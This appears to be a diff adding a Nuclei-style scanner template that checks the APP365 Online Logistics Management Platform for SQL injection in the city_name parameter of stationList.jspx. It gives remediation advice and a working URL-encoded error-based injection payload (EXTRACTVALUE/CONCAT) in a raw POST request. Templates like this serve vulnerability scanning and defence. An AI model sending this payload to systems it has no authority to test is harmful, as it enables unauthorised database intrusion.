@@ -1,0 +1,38 @@
+id: wooyun-2010-088177
+info:
+  name: APP365 Online Logistics Management Platform stationList.jspx city_name SQL Injection Vulnerability
+  author:
+  - jim2g
+  description: |
+    The city_name parameter of stationList.jspx in the APP365 Online Logistics Management Platform has a SQL injection vulnerability
+    Structured Query Language (SQL) is a database query and programming language used to access data, as well as to query, update, and manage relational database systems. It is also the file extension of database script files.
+    In web applications, SQL statements are usually used to query and update database data, and such operations usually come with some conditions that are typically supplied by user input. Malicious users can therefore modify the relevant conditions to execute malicious SQL statements to obtain or update database data. If the database account has high privileges, they can even inject malicious SQL statements to call special database functions to read/write files on the server or execute operating system commands.
+  severity: high
+  remediation: |
+    Official fix:
+    1. It is recommended that users obtain the latest patch or latest version from the official website:
+    http://www.so56.cc
+    Temporary fix:
+    1. Use prepared statements. When using PDO, do not directly concatenate variables into PDO statements. Use the parameterized query interface provided by the database for all query statements; parameterized statements use parameters instead of embedding user-supplied variables into SQL statements. Almost all database systems currently provide a parameterized SQL execution interface, which can very effectively prevent SQL injection attacks.
+    2. Escape or encode special characters that enter the database (such as <>&*; etc.), or convert their encoding.
+    3. Confirm the type of each data value; for example, numeric data must be numeric, and corresponding database storage fields must be of integer type.
+    4. Strictly limit data lengths, which to some extent prevents overly long SQL injection statements from executing correctly.
+    5. Unify the encoding of every data layer of the website; UTF-8 is recommended for all. Inconsistent encoding between layers may allow some filtering models to be bypassed.
+    6. Strictly limit the database operation privileges of website user accounts, granting only the minimum privileges needed for their work, thereby maximizing the reduction of harm caused by injection attacks to the database.
+    7. Avoid displaying SQL error messages on the website, such as type errors or field mismatches, to prevent attackers from using these error messages to make judgments.
+    8. Filter dangerous characters, for example: use regular expressions to match keywords such as union, sleep, and, select, and load_file, and terminate execution if any are matched.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==500
+    - contains(body,'~~~G~~~')
+  raw:
+  - |
+    POST /site56/Station/stationList.jspx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    btn=88952634&city_name=%E8%AF%B7%E9%80%89%E6%8B%A9/%E8%BE%93%E5%85%A5%E5%9F%8E%E5%B8%82%E5%90%8D%E7%A7%B0%27%29%20AND%20EXTRACTVALUE%281373%2CCONCAT%280x7e7e7e%2Cchar%2871%29%2C0x7e7e7e%29%29%20AND%20%28%27a%27%3D%27a
+  req-condition: true
